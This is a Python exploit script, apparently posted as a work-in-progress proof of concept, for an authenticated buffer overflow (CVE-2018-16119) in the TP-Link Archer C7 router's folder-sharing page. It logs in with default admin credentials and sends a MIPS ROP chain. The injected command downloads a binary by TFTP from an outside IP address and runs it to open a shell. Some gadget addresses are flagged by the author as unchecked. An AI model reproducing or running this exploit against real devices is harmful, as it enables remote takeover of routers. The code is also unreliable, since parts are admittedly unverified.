# Title: TP-Link Archer C7 v2 - Authenticated Remote Code Execution [WIP Already Crash :)]
# Author: Alejandro Parodi
# Date: 2019-11-29
# Vendor Homepage: https://www.tp-link.com/
# Afected Hardware: https://www.tp-link.com/us/home-networking/wifi-router/archer-c7/
# Version: Tested Over Firmware v3.14.3 150427 Rel.36706n
# CVE: CVE-2018-16119 Improved for Archer C7
# References:
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16119
# Twitter: @hdbreaker_

import re
import os
import md5
import sys
import time
import struct
import base64
import urllib
import requests

if os.geteuid() != 0:
   exit("You need to have root privileges to run this script. Sorry!\n")

print "[#] Starting TFTP Server, please run as root!"
wifi_interface = "eth0" # Yep I am a MAC User!
cmd = "ptftpd -p 69 %s ./tftp_server &" % wifi_interface
os.system(cmd)
time.sleep(1)

print "[#] Trying to obtein a valid Session!"
base_url = "http://178.164.131.28:100"
login_url = base_url+"/userRpm/LoginRpm.htm?Save=Save"
router_user = "admin"
router_passwd = "admin"
basic_string = base64.b64encode(router_user + ":" + router_passwd)
cookie_auth_string = urllib.quote("Basic "+base64.b64encode(router_user + ":" + md5.new(router_passwd).hexdigest()))

headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
            "Accept-Language": "en-US,en;q=0.9,es;q=0.8",
            "Referer": "http://178.164.131.28:100/",
            "Accept-Encoding": "gzip, deflate",
            "Cookie": "Authorization="+cookie_auth_string,
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
          }

session_id = ""
for tries in range(0,5):
    try:
        r = requests.get(login_url, headers=headers)
        session_id = re.findall('[A-Z]{16}', r.text)[0]
    except:
        pass
    if session_id != "":
        print "[#] A session was obteined!"
        break
    if tries == 4:
        print "[-] Exploit Failed :("
        sys.exit()

print "[#] Crafting Payload"
# Padding for the Overflow
padding = "D"*260

# mov $a0, $s2; jmp $s1
# This will set the argument of System Syscall
# $s2 contain the p_cmd
# $s2 will be moved to $a0 (First Argument in MIPS Syscall Convention)
# After this the exploit will jump to $s1 (System Address)
# Gadget in libuClib-0.9.30
s0 = "%2A%B1%FD%7C" # Big Endian Address # TODO: CHECK THIS ADDRESS!!!!! [WIP] also fix this address in the wr1043 exploit and put an image about this gadget in the POST!

# System Address in libuClib-0.9.30
s1 = "%2A%B3%21%50" # Big Endian Address

# mov $s2, $sp, jmp s0;
# This is the Stack Pivot
# $sp is pointing to the command to execute
# and will be moved to $s2, after this will jump to $s0
# # Gadget in libuClib-0.9.30
pc = "%2A%AF%84%C0" # Big Endian Address
rop_junk = "X" * 24
p_cmd = "tftp%20-g%20-r%20shh%20165.227.59.126;chmod%20777%20shh;./shh"

rop = pc + rop_junk + p_cmd
payload = padding + s0 + s1 + rop

print "[#] Triggering the Bug"
print "[#] Wait some seconds and enjoy your Shell!!!"
bof_url = base_url+"/"+session_id+"/userRpm/NasFolderSharingRpm.htm?displayName=bof&mediaShare=on&shareFolderName="+payload+"&Save=Save&selPage=0&Page=1&subpage=2&no_use_para_just_fix_ie_sub_bug="
r = requests.get(bof_url, headers=headers)

#logout_url = base_url+"/"+session_id+"/userRpm/LogoutRpm.htm"
#r = requests.get(logout_url, headers=headers)
